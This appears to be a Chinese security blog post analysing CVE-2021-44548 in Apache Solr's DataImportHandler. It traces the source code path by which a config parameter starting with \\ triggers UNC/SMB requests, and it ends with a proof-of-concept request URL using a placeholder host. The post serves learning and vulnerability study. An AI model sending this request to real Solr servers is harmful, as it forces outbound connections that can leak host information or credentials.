## 前言
之前在zsxq看到有师傅发solr的洞：[CVE-2021-44548](https://nvd.nist.gov/vuln/detail/CVE-2021-44548)，今天看了一下，但是好像危害不大，不过还是以学习为主看一波
> 描述：  
>  Apache Solr 的 DataImportHandler 中的一个不正确的输入验证漏洞允许攻击者提供 Windows UNC 路径，导致从
> Solr 主机向网络上的另一台主机进行 SMB 网络调用。
## 影响版本
version 
          data-config.xml
重启solr即可
## 漏洞分析
这里补丁判断了resource是否开头为`\\`
再看一下描述
所以这个漏洞就是通过resource为`\\ip`，然后solr就回去请求该unc路径造成信息泄露什么的
然后下一步找触发点
在dataimport这里可以看到能加载data-config.xml
点一下reload，看一下请求路由
[http://localhost:8983/solr/core1/dataimport?_=1640242938294&command=reload-config&indent=on&wt=json](http://localhost:8983/solr/core1/dataimport?_=1640242938294&command=reload-config&indent=on&wt=json)
可以发现处理请求的地方在`DataImportHandler#handleRequestBody`
其实这个地方根据之前写的`solrconfig.xml`也能看到
这里发现如果传入的`command=show-config`并且传入`config`不为空则有一个`openResource`操作，且参数可控
跟入`solr-core-8.11.0.jar!\org\apache\solr\core\SolrResourceLoader.openResource`
这里的342行
`this.getInstancePath()`得到的路径为`D:\Apache_Solr\solr-8.11.0\server\solr\core1`
再执行`resolve("conf")`变成，`D:\Apache_Solr\solr-8.11.0\server\solr\core1\conf`
再执行`resolve(resource)`时，这里的WindowsPathType变成了UNC
resolve逻辑判断WindowsPathType是否为绝对路径或UNC路径，是则直接返回参数
所以只要resource以`\\`开头就能使`inConfigDir`完全可控，在`Files.exists`中就会去请求windows的unc路径，这里用dnslog代替了
本来想试一下能不能任意文件读，但是这里会处理`..`然后判断开头是否为SolrCore的路径，所以只能读SolrCore下的文件，要么就开启`-Dsolr.allow.unsafe.resourceloading=true`
`http://localhost:8983/solr/core1/dataimport?command=show-config&config=\\xxx\xxx`
太菜了不知道怎么扩大危害